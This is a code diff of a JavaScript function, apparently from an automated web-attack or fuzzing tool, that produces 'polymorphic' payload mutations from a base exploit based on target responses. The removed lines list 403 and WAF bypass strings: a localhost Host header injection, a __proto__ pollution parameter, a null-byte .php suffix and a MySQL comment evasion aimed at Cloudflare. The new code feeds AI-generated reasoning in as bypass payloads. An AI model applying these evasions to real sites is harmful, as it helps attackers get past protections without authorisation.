@@ -40,32 +40,29 @@ export async function neuralFuzz(context) {
  */
 export async function quantumMutate(context) {
     log.info(`Quantum Mutation cycle started for ${context.target_url}`);
-    const mutations = context.feedback_responses.map((resp, i) => {
+    const { PayloadMutator } = await import("./payload_mutator.js");
+    const mutator = new PayloadMutator();
+    const mutations = [];
+    for (const resp of context.feedback_responses) {
         // Use AI reasoning if available to synthesize a precise bypass
         if (resp.ai_reasoning) {
-            log.info(`Applying AI-synthesized mutation for response ${i}...`);
-            return resp.ai_reasoning;
+            log.info(`Applying AI-synthesized mutation...`);
+            mutations.push(resp.ai_reasoning);
+            continue;
         }
-        if (resp.status === 403) {
-            // Advanced bypasses
-            const bypasses = [
-                `${context.base_exploit} HTTP/1.1\nHost: 127.0.0.1\n\n`,
-                `${context.base_exploit}?__proto__[polluted]=true`,
-                `${context.base_exploit}\x00.php`
-            ];
-            return bypasses[Math.floor(Math.random() * bypasses.length)];
+        // Use systematic mutation engine
+        const evolved = mutator.evolve(context.base_exploit, resp);
+        if (evolved.length > 0) {
+            mutations.push(...evolved);
         }
-        if (resp.status === 500 && resp.body.includes("SyntaxError")) {
-            return `${context.base_exploit}'`; // Trigger deeper crash
+        else {
+            // Default heuristics if no specific feedback trigger
+            mutations.push(`${context.base_exploit}?cb=${Math.random().toString(36).substring(7)}`);
         }
-        if (resp.body.toLowerCase().includes("waf") || resp.body.toLowerCase().includes("cloudflare")) {
-            return `${context.base_exploit} /*!50000%00%23*/`; // Advanced WAF bypass signature
-        }
-        return `${context.base_exploit}?cb=${Math.random().toString(36).substring(7)}`; // Cache buster
-    });
+    }
     return {
         status: "active",
-        mutations: mutations,
+        mutations: Array.from(new Set(mutations)), // De-duplicate
         message: "Polymorphic payload evolution cycle complete."
     };
 }
